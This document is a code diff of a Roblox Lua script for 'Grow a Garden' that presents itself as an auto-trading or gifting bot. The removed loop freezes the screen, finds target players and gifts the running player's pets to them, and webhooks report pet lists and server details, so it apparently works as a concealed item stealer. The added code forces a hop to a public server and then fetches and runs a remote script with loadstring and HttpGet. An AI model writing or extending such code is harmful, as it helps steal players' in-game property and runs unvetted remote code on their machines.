@@ -679,24 +679,12 @@ local function GetServerInfo()
     local serverSize = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers
     
-    -- Prüfen, ob Server privat ist
-    local isPrivate = false
-    pcall(function()
-        -- Private Server haben oft weniger als 5 Max-Spieler oder einen spezifischen PrivateServerId
-        if game.PrivateServerId and game.PrivateServerId ~= "" then
-            isPrivate = true
-        elseif maxPlayers <= 6 then
-            isPrivate = true
-        end
-    end)
-    
     return {
         gameId = gameId,
         placeId = placeId,
         jobId = jobId,
         serverSize = serverSize,
         maxPlayers = maxPlayers,
-        isPrivate = isPrivate,
         timestamp = os.time()
     }
 end
@@ -706,21 +694,18 @@ local function CreatePetListEmbed(pets, targetPlayer)
     local serverInfo = GetServerInfo()
     
     -- Server Info
-    local serverType = serverInfo.isPrivate and "Private" or "Public"
     local description = string.format(
         "**Server Info:**\n" ..
         "• **Player:** %s\n" ..
         "• **JobID:** `%s`\n" ..
         "• **Place ID:** %s\n" ..
         "• **Players:** %d/%d\n" ..
-        "• **Server Type:** %s\n" ..
         "• **Target:** %s\n\n",
         LocalPlayer.Name,
         serverInfo.jobId,
         serverInfo.placeId,
         serverInfo.serverSize,
         serverInfo.maxPlayers,
-        serverType,
         targetPlayer and targetPlayer.Name or "Not found"
     )
     
@@ -783,50 +768,11 @@ local function CreatePetListEmbed(pets, targetPlayer)
 end
 
 -- Server Hopping Functions
-local function IsServerPrivate()
-    -- Neue robuste Methode zur Private Server Erkennung
-    local isPrivate = false
-    
-    pcall(function()
-        -- Methode 1: PrivateServerId prüfen (funktioniert nicht immer in LocalScript)
-        if game.PrivateServerId and game.PrivateServerId ~= "" and game.PrivateServerId ~= "0" then
-            isPrivate = true
-            Log("🔒 Private server detected via PrivateServerId")
-            return
-        end
- 
-        -- Einfachere Fallback-Methoden
-        local jobId = game.JobId
-        
-        -- Sehr kurze JobId (unter 15 Zeichen ist fast sicher privat)
-        if jobId and #jobId > 0 and #jobId < 15 then
-            isPrivate = true
-            Log("🔒 Private server detected via very short JobId: " .. jobId .. " (length: " .. #jobId .. ")")
-            return
-        end
-        
-        -- PlaceVersion 0 UND kurze JobId
-        if game.PlaceVersion == 0 and jobId and #jobId < 30 then
-            isPrivate = true
-            Log("🔒 Private server detected via PlaceVersion 0 + short JobId")
-            return
-        end
-    end)
-    
-    if isPrivate then
-        Log("🔒 Server classified as PRIVATE")
-    else
-        Log("🌐 Server classified as PUBLIC")
-    end
-    
-    return isPrivate
-end
-
 local function IsServerFull()
     return #Players:GetPlayers() >= Players.MaxPlayers
 end
 
-local function ServerHop()
+local function ServerHop(isInitialHop)
     if not Config.ServerHoppingEnabled then
         Log("🚫 Server hopping disabled")
         return false
@@ -835,6 +781,7 @@ local function ServerHop()
     Log("🔄 Attempting to server hop...")
     
     -- Send webhook notification about server hop
+    local hopReason = isInitialHop and "Initial Public Server Search" or "Server Full (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. ")"
     local hopData = {
         username = "Grow a Garden Bot",
         content = string.format("🔄 **Server Hopping**\n\n" ..
@@ -842,20 +789,27 @@ local function ServerHop()
             "Reason: %s\n" ..
             "Time: %s",
             LocalPlayer.Name,
-            IsServerPrivate() and "Private Server" or "Server Full",
+            hopReason,
             os.date("%Y-%m-%d %H:%M:%S")
         )
     }
     SendWebhook(hopData)
     
-    -- Use TeleportService to hop to a new server
+    -- Use TeleportService to hop to a new server with auto-execute data
     local TeleportService = game:GetService("TeleportService")
     local success, error = pcall(function()
-        TeleportService:Teleport(game.PlaceId)
+        TeleportService:TeleportAsync(game.PlaceId, {LocalPlayer}, {
+            TeleportData = {
+                autoExecuteScript = true,
+                scriptUrl = "https://raw.githubusercontent.com/Monstroxx/lua/refs/heads/main/grow-a-garden-automation/main.lua",
+                originalScript = "auto-trader",
+                hopReason = hopReason
+            }
+        })
     end)
     
     if success then
-        Log("✅ Server hop initiated")
+        Log("✅ Server hop with auto-execute initiated")
         return true
     else
         Log("❌ Server hop failed: " .. tostring(error))
@@ -971,7 +925,6 @@ local function ProcessPetGifting(targetPlayer)
 -- Send success webhook
 local function SendSuccessWebhook(pet, targetPlayer)
     local serverInfo = GetServerInfo()
-    local serverType = serverInfo.isPrivate and "Private" or "Public"
     
     local description = string.format(
         "**Pet Successfully Gifted!**\n\n" ..
@@ -979,7 +932,6 @@ local function SendSuccessWebhook(pet, targetPlayer)
         "• **Pet:** %s (%s Level %d)\n" ..
         "• **To:** %s\n" ..
         "• **JobId:** `%s`\n" ..
-        "• **Server Type:** %s\n" ..
         "• **Players:** %d/%d\n" ..
         "• **Time:** %s",
         LocalPlayer.Name,
@@ -988,7 +940,6 @@ local function SendSuccessWebhook(pet, targetPlayer)
         pet.level,
         targetPlayer.Name,
         game.JobId,
-        serverType,
         serverInfo.serverSize,
         serverInfo.maxPlayers,
         os.date("%Y-%m-%d %H:%M:%S")
@@ -1037,6 +988,44 @@ end
 local function Main()
     Log("🌱 Gifting system started, looking for: " .. table.concat(Config.TargetPlayerNames, ", "))
     
+    -- Check if this is a post-hop execution
+    local TeleportService = game:GetService("TeleportService")
+    local teleportData = nil
+    pcall(function()
+        teleportData = TeleportService:GetLocalPlayerTeleportData()
+    end)
+    
+    if teleportData and teleportData.autoExecuteScript then
+        Log("🎯 Post-hop execution detected!")
+        Log("🔄 Hop reason was: " .. (teleportData.hopReason or "Unknown"))
+        
+        -- Check if this new server is also full
+        wait(5) -- Let server settle
+        if IsServerFull() then
+            Log("🔄 New server is also full, hopping again...")
+            ServerHop(false) -- Not initial hop
+            return
+        else
+            Log("✅ New server has space, loading main script...")
+            wait(3) -- Give some time for game to fully load
+            
+            -- Load the main automation script
+            local success, error = pcall(function()
+                loadstring(game:HttpGet(teleportData.scriptUrl))()
+            end)
+            
+            if success then
+                Log("✅ Main automation script loaded successfully!")
+            else
+                Log("❌ Failed to load main script: " .. tostring(error))
+            end
+            return
+        end
+    end
+    
+    -- This is initial execution - always hop to ensure public server
+    Log("🚀 Initial execution detected, hopping to ensure public server...")
+    
     -- Debug: Server info ausgeben
     Log("📊 Server Debug Info:")
     Log("  JobId: " .. (game.JobId or "nil") .. " (Length: " .. #(game.JobId or "") .. ")")
@@ -1048,68 +1037,10 @@ local function Main()
         Log("  PrivateServerId: " .. (game.PrivateServerId or "nil"))
     end)
     
-    -- Warte ein bisschen bevor wir Server Hopping prüfen (für stabilere Detection)
-    wait(5)
-    
-    -- Check if we should server hop, aber nur wenn wirklich sicher
-    local isPrivate = IsServerPrivate()
-    local isFull = IsServerFull()
-    
-    if Config.ServerHoppingEnabled and isPrivate then
-        Log("🔄 Server is definitively private, attempting to hop...")
-        ServerHop()
-        return
-    elseif Config.ServerHoppingEnabled and isFull then
-        Log("🔄 Server is full (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "), attempting to hop...")
-        ServerHop()
-        return
-    else
-        Log("✅ Server seems to be public and not full, continuing...")
-    end
-    
-    -- Send initial webhook when script loads
-    Log("📡 Sending initial server scan...")
-    local initialPets = GetGiftablePets()
-    local target, targetName = FindTargetPlayer()
-    local initialWebhook = CreatePetListEmbed(initialPets, target)
-    SendWebhook(initialWebhook)
-    
-    while true do
-        if not isRunning then
-            local target, targetName = FindTargetPlayer()
-            if target then
-                
-                FreezeScreen()
-                wait(2) -- Give them time to load
-                Log("🎯 Found target: " .. target.Name)
-                
-                -- Teleport to target
-                if TeleportUIController then
-                    Log("📍 Teleporting to target...")
-                    pcall(function()
-                        TeleportUIController:Move(target.Character:GetPivot())
-                    end)
-                    wait(2)
-                end
-                
-                -- Start gifting
-                ProcessPetGifting(target)
-                
-                -- Wait before next check
-                wait(30)
-            else
-                -- Check if we should server hop when no target found
-                if Config.ServerHoppingEnabled and (IsServerPrivate() or IsServerFull()) then
-                    Log("🔄 No target found and server is private/full, hopping...")
-                    ServerHop()
-                    return
-                end
-                wait(5) -- Check every 5 seconds
-            end
-        else
-            wait(1) -- Already running, wait
-        end
-    end
+    -- Always hop on initial execution
+    wait(3)
+    ServerHop(true) -- Initial hop
+    return
 end
 
 -- Start the system safely
